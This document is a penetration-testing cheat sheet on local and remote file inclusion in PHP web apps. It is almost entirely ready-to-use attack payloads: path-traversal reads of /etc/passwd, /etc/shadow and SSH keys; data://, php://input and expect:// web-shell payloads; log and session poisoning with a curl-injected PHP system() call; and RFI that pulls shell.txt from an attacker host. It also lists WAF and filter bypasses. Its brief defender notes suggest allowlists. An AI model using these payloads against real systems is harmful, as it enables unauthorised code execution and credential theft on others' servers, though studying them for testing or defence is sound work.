# LFI / RFI — File Inclusion

Abuse a parameter that loads a file by path so you can read arbitrary local files (**LFI**) or
include a remote file (**RFI**) — and, via log poisoning, wrappers, or session files, turn file
**reading** into code **execution**.

Replace placeholders (`<...>`) with your own values: `<target>`, `<your-ip>`.

---
---

# PART 1 — OVERVIEW (at a glance)

## The ladder — reading → RCE

| Level | Technique | Result |
|-------|-----------|--------|
| Read | `../../../../etc/passwd` | Arbitrary local file read |
| Read source | `php://filter/convert.base64-encode/…` | App source → secrets/DB creds |
| **RCE (wrapper)** | `data://` · `php://input` · `expect://` | Run PHP you supply |
| **RCE (poison)** | logs · sessions · `/proc/self/environ` | Include a file you wrote PHP into |
| **RCE (RFI)** | `?page=http://<your-ip>/shell.txt` | Include remote PHP (needs `allow_url_include`) |

## The workflow

1. **Spot** an inclusion param (`?page= ?file= ?include= ?template= ?lang= ?view=`).
2. **Confirm LFI** — read a known file with path traversal.
3. **Read source** with `php://filter` — find secrets and a writable sink.
4. **Escalate to RCE** — a wrapper, or poison a file (log/session) then include it.
5. **RFI** if `allow_url_include=On` — the easy win.

## Go-to payloads

```
?page=../../../../etc/passwd                                    # confirm LFI
?page=php://filter/convert.base64-encode/resource=index.php     # read PHP source
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==&c=id   # RCE
?page=http://<your-ip>/shell.txt                                # RFI
```

## Defender notes (for the report)

- Never build include paths from user input — use an **allowlist** of page names/IDs.
- Disable `allow_url_include` / `allow_url_fopen`; restrict `open_basedir`.
- Store uploads/logs outside the web root; run the app as a low-privilege user.

---
---

# PART 2 — DETAILED WALKTHROUGH

## Step 1 — Spot inclusion params

Params that name a page/file/template: `?page= ?file= ?include= ?template= ?lang= ?view=
?doc= ?path=`. Values that look like `file.php`, `en`, `home`.

## Step 2 — Confirm LFI (read a known file)

```
?page=/etc/passwd
?page=../../../../etc/passwd            # climb out of the web root
?page=....//....//....//etc/passwd      # bypass one round of ../ stripping
Windows:  ?page=C:\Windows\win.ini   ?page=../../../../windows/win.ini
```

```
what you see: root:x:0:0:root:/root:/bin/bash  ← file contents in the response
```

If the app appends `.php`, break it (varies by version/config):

```
?page=/etc/passwd%00        # null byte — PHP < 5.3.4 only
?page=php://filter/...      # wrappers don't need the extension
# or path truncation (very long ../ chains on old PHP)
```

## Step 3 — PHP wrappers (read source & run code)

```
# read PHP source, base64-encoded (see the code, find secrets):
?page=php://filter/convert.base64-encode/resource=index.php
# → base64 -d the output

# execute PHP you supply (needs allow_url_include=On):
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==&c=id
?page=php://input   (POST body = <?php system($_GET[c]); ?>)   &c=id

# expect / zip / phar wrappers:
?page=expect://id
?page=zip://shell.zip%23shell.php     ?page=phar://shell.phar/x
```

## Step 4 — LFI → RCE without wrappers (poisoning)

**Log poisoning** — inject PHP into a log the app will include:

```bash
# 1) poison the User-Agent (lands in the access log):
curl http://<target>/ -A '<?php system($_GET[c]); ?>'
# 2) include the log and run commands:
?page=/var/log/apache2/access.log&c=id
```

Other write-then-include sinks:

```
/var/log/nginx/access.log            # same idea, nginx
/var/log/auth.log                    # ssh with username = <?php ... ?>
/proc/self/environ                   # poison via User-Agent (older setups)
/var/lib/php/sessions/sess_<PHPSESSID>   # write PHP into your own session
/var/mail/<user>                     # SMTP body
```

## Step 5 — RFI (include a remote file — rarer)

Requires `allow_url_include=On`. Host your payload and include it:

```bash
# attacker: serve shell.txt (contains: <?php system($_GET['c']); ?>)
python3 -m http.server 80
# target:
?page=http://<your-ip>/shell.txt&c=id
?page=http://<your-ip>/shell.txt%00       # if an extension is appended
```

## Step 6 — Useful reads & escalation

```
/etc/passwd  /etc/hosts  /etc/shadow (if root)  /home/<user>/.ssh/id_rsa
/var/www/html/config.php  .env  wp-config.php          # DB creds / secrets
/proc/self/cmdline  /proc/self/environ
Windows: C:\inetpub\wwwroot\web.config  \Windows\System32\drivers\etc\hosts
```

Automate LFI hunting: `ffuf`/LFISuite with `/usr/share/seclists/Fuzzing/LFI/*.txt`.

---
---

# PART 3 — PAYLOAD ARSENAL

## Path-traversal variants

```
../../../../etc/passwd                 # basic
....//....//....//etc/passwd           # ../ stripped once
..%2f..%2f..%2fetc%2fpasswd            # URL-encoded /
..%252f..%252f..%252fetc%252fpasswd    # double-encoded (WAF)
/etc/passwd                            # absolute (if no prefix forced)
%2e%2e%2f repeated                     # encoded ../
..\..\..\windows\win.ini               # Windows backslash
```

## Wrapper reference

| Wrapper | Use | Needs |
|---------|-----|-------|
| `php://filter/convert.base64-encode/resource=X` | Read source of X | — |
| `data://text/plain;base64,<b64>` | Run supplied PHP | `allow_url_include` |
| `php://input` (PHP in POST body) | Run supplied PHP | `allow_url_include` |
| `expect://id` | Run a shell command | `expect` ext |
| `zip://a.zip%23a.php` / `phar://` | Run PHP from an uploaded archive | file upload |

## LFI → RCE sinks (write here, then include)

```
/var/log/apache2/access.log   /var/log/nginx/access.log   (poison User-Agent)
/var/log/auth.log             (ssh username = PHP)
/var/lib/php/sessions/sess_<PHPSESSID>   (write PHP into your session)
/proc/self/environ            (older setups)   /var/mail/<user>   uploaded avatar path
```

## Filter bypass

```
../ stripped once     → ....//   ..%2f   ..%252f
extension appended    → php://filter (no ext) · %00 (old PHP) · path truncation
absolute-path filter  → leading ../ still climbs from the web root
keyword "http" blocked (RFI) → HtTp:// · use \\your-ip\share (SMB, Windows)
```

---

**Key idea:** file inclusion lets you control which file the server loads. Read-only LFI already
leaks source, configs, and keys; the real prize is code execution — reached by `php://filter`
(read source) plus a wrapper (`data://`, `php://input`), or by poisoning a file you can write to
(logs, sessions) and then including it. RFI is the easy win when `allow_url_include` is on. Fix:
never build include paths from user input; allowlist page names.
